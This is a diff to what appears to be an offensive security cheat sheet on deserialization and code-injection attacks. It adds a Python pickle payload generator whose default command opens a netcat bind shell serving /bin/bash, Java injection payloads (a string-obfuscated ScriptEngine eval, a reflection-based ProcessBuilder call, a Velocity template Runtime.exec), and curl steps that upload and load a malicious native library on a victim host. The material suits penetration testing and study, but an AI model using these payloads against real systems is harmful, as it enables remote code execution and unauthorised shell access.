@@ -77,5 +77,56 @@ namespace DotNetExploit
 
 Look for vulnerable libraries by using snyk.io and ossindex
 
+Pickle exploit example
 
+```python
+import cPickle
+import sys
+import base64
+
+DEFAULT_COMMAND = "netcat -c '/bin/bash -i' -l -p 4444"
+COMMAND = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_COMMAND
+
+class PickleRce(object):
+    def __reduce__(self):
+        import os
+        return (os.system,(COMMAND,))
+
+print base64.b64encode(cPickle.dumps(PickleRce()))
+```
+
+## Java
+
+**Equals\(&lt;userinput&gt;\) vector**
+
+```text
+"".equals(javax.script.ScriptEngineManager.class.getConstructor()
+.newInstance().getEngineByExtension("js")
+.eval("java.lang.Auntime.getAuntime().exec(\\"touch /tmp/owned.jsp\\")"
+.replaceAll("A","R")))
+```
+
+**controller.getClass\(\).getMethod\(task\).invoke\(controller\);**
+
+```text
+rawJson={"controller":"java.lang.ProcessBuilder","task":"start","data":["touch","hacked.jsp"]}
+```
+
+**renderFragment\(\)**
+
+```text
+user=&temp=#set($s="")#set($stringClass=$s.getClass()
+.forName("java.lang.Runtime").getRuntime()
+.exec("touch hacked.jsp"))$stringClass
+```
+
+**System.loadLibrary\(\)**
+
+1. Upload file:
+
+`curl -v -F 'upload=@/tmp/libDEOBFUSCATION_LIB.so' [<http://victim.org/>](<http://victim.org/>)`
+
+1. Load malicious library:
+
+`curl -v --cookie 'env=.java.library.path@/var/myapp/data'`
 
